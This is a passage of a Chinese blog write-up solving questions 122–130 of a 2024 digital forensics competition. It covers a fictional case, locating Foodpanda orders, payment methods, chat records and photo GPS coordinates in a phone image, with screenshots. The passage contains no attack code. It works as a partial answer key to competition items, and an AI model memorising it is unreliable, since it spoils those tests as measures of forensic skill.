+<h5 id="d.-f">D. F</h5>
+<p>这个上面那张图后面有，Z盘。</p>
+<h4 id="判断题参考john_desktop.e01john_nas_1.e01和john_nas_2.e01当中的v文件夹内的视频及照片数量是相同的">122.[判断题]参考John_Desktop.E01，John_NAS_1.E01和John_NAS_2.E01，当中的v文件夹内的视频及照片数量是相同的？</h4>
+<p>这个就跳了。</p>
+<h4 id="填空题参考john_nas_1.e01和john_nas_2.e01该nas的a文件夹中1.jpeg是由哪个网站生成答案格式abcd.com">123.[填空题]参考John_NAS_1.E01和John_NAS_2.E01，该NAS的a文件夹中，“1.jpeg”是由哪个网站生成？（答案格式：abcd.com）</h4>
+<p>这个电脑里也有，搜得到那就查一下元数据。 <img src="https://github.com/ncbdd0/images/raw/main/meiya2024group/87-130/35.png"></p>
+<h4 id="填空题参考john_nas_1.e01和john_nas_2.e01该nas的c文件夹中有一个被删除了的照片它的名称是什么答案格式小写英文字母阿拉伯数字和符号-混合组成例如123-abcf-456.jpg">124.[填空题]参考John_NAS_1.E01和John_NAS_2.E01，该NAS的c文件夹中，有一个被删除了的照片，它的名称是什么？（答案格式：小写英文字母，阿拉伯数字和符号’-’混合组成，例如：123-abcf-456.jpg）</h4>
+<p>这个也跳了。</p>
+<h3 id="alice的android手机取证-1"><em>Alice的Android手机取证</em></h3>
+<h4 id="填空题根据你以上的发现你直觉认为有无辜的人被雇为所谓的客服人员他们的安全仍然存在疑虑你决定再次查看alice的手机镜像以确认你的推测参考alice_mobile.bin于2024年8月16日alice使用外送程序foodpanda于哪间店铺点餐答案格式大写英文字母例如goodcafecentral">125.[填空题]根据你以上的发现，你直觉认为有无辜的人被雇为所谓的客服人员，他们的安全仍然存在疑虑。你决定再次查看Alice的手机镜像以确认你的推测。参考Alice_Mobile.bin，于2024年8月16日，Alice使用外送程序“Foodpanda”于哪间店铺点餐？（答案格式：大写英文字母，例如：GOODCAFE(CENTRAL)）</h4>
+<p>这个在foodpanda的文件夹下的数据库文件里找，有个叫order的，她好像就点了这一单。 <img src="https://github.com/ncbdd0/images/raw/main/meiya2024group/87-130/36.png"></p>
+<h4 id="单选题参考alice_mobile.bin于2024年8月30日alice使用外送程序foodpanda点餐用了哪种方式付款">126.[单选题]参考Alice_Mobile.bin，于2024年8月30日，Alice使用外送程序“Foodpanda”点餐用了哪种方式付款？</h4>
+<h5 id="a.-微信支付">A. 微信支付</h5>
+<h5 id="b.-payme">B. PayMe</h5>
+<h5 id="c.-支付宝">C. 支付宝</h5>
+<h5 id="d.-现金">D. 现金</h5>
+<h5 id="e.-信用卡">E. 信用卡</h5>
+<p>这个cart数据库（应该意思是购物车）里面有。 <img src="https://github.com/ncbdd0/images/raw/main/meiya2024group/87-130/37.png"></p>
+<h4 id="填空题参考alice_mobile.binalice最后使用外卖程序foodpanda的日期答案格式yyyy-mm-dd">127.[填空题]参考Alice_Mobile.bin，Alice最后使用外卖程序“Foodpanda”的日期？（答案格式:YYYY-MM-DD）</h4>
+<p>时间线里查一下就好。 <img src="https://github.com/ncbdd0/images/raw/main/meiya2024group/87-130/38.png"></p>
+<h4 id="单选题参考alice_mobile.binalice要求安排客务人员逃到哪里">128.[单选题]参考Alice_Mobile.bin，Alice要求安排“客务人员”逃到哪里？</h4>
+<h5 id="a.-埃及">A. 埃及</h5>
+<h5 id="b.-阿根廷">B. 阿根廷</h5>
+<h5 id="c.-巴西">C. 巴西</h5>
+<h5 id="d.-哥伦比亚">D. 哥伦比亚</h5>
+<h5 id="e.-南非">E. 南非</h5>
+<p>这个和前面的题一个步骤，查骗钱三人组聊天记录就好。 <img src="https://github.com/ncbdd0/images/raw/main/meiya2024group/87-130/39.png"></p>
+<h4 id="单选题参考alice_mobile.binalice曾经向客服人员发送一张照片指出上船地点的位置拍摄这张照片的gps经纬值是什么">129.[单选题]参考Alice_Mobile.bin，Alice曾经向“客服人员”发送一张照片，指出上船地点的位置，拍摄这张照片的GPS经纬值是什么？</h4>
+<h5 id="a.-22.474444444444114.039722222222">A. 22.474444444444,114.039722222222</h5>
+<h5 id="b.-22.473611111111114.042777777778">B. 22.473611111111,114.042777777778</h5>
+<h5 id="c.-22.475277777778114.038888888889">C. 22.475277777778,114.038888888889</h5>
+<h5 id="d.-22.475000000007114.035833333333">D. 22.475000000007,114.035833333333</h5>
+<h5 id="e.-22.476388888889114.036388888889">E. 22.476388888889,114.036388888889</h5>
+<p>找到图片后导出。 <img src="https://github.com/ncbdd0/images/raw/main/meiya2024group/87-130/40.png"> <img src="https://github.com/ncbdd0/images/raw/main/meiya2024group/87-130/41.png"></p>
+<p>图片属性里的不是十进制，丢给ai转一下。 <img src="https://github.com/ncbdd0/images/raw/main/meiya2024group/87-130/42.png"></p>
+<h4 id="单选题参考alice_mobile.bin根据多媒体文件的分析于2024年8月16日alice曾到哪里进行拍摄凭着你及团队的机智及专业知识成功锁定犯罪团伙禁锢人质的位置行动单位根据你的讯息迅速展开拯救行动赶在被押离港前成功救出人质">130.[单选题]参考Alice_Mobile.bin，根据多媒体文件的分析，于2024年8月16日，Alice曾到哪里进行拍摄？凭着你及团队的机智及专业知识，成功锁定犯罪团伙禁锢人质的位置。行动单位根据你的讯息,迅速展开拯救行动，赶在被押离港前成功救出人质。</h4>
+<h5 id="a.-旺角">A. 旺角</h5>
+<h5 id="b.-沙田">B. 沙田</h5>
+<h5 id="c.-黄大仙">C. 黄大仙</h5>
+<h5 id="d.-大生围">D. 大生围</h5>
+<h5 id="e.-天水围">E. 天水围</h5>
+<p>时间排序后找16号的图片这张里有。 <img src="https://github.com/ncbdd0/images/raw/main/meiya2024group/87-130/43.png"></p>
+<p>写到这里团队赛的130终于被我做完了……不得不说团队赛的难度比资格赛还是大了很多，虽然也有理论题可以ai一把梭，但是能取证直接查出来的也少了很多，比较郁闷的是U盘取证和服务器取证还是不是很熟悉，应该会拿取证杯的再练一下。这次做还涉及了一些CTF的知识像隐写还有逆向啊，尤其是apk逆向分析，我基本直接跳了TT。明天应该小小地复盘一下自己做过的从21-24的题，总不能光刷不长记性orz。</p>
+
+    </div>
+    
+    
+    
+    
+    
+    
+    
+</div>
+
+            <footer id="footer">
+    <div id="footer-wrap">
+        <div>
+            &copy;
+            2022 - 2026 OvO
+            <span id="footer-icon">
+                <i class="fa-solid fa-font-awesome fa-fw"></i>
+            </span>
+            &commat;你猜不到的
+        </div>
+        <div>
+            Based on the <a target="_blank" rel="noopener" href="https://hexo.io">Hexo Engine</a> &amp;
+            <a target="_blank" rel="noopener" href="https://github.com/theme-particlex/hexo-theme-particlex">ParticleX Theme</a>
+        </div>
+        
+        <div>
+            备案号：
+            
+            
+            
+        </div>
+        
+    </div>
+</footer>
+
+        </div>
+        
+        <transition name="fade">
+            <div id="preview" ref="preview" v-show="previewShow">
+                <img id="preview-content" ref="previewContent" />
+            </div>
+        </transition>
+        
+    </div>
+    <script src="/js/main.js"></script>
+    
+    
+
+
+
+
+    
+</body>
+</html>
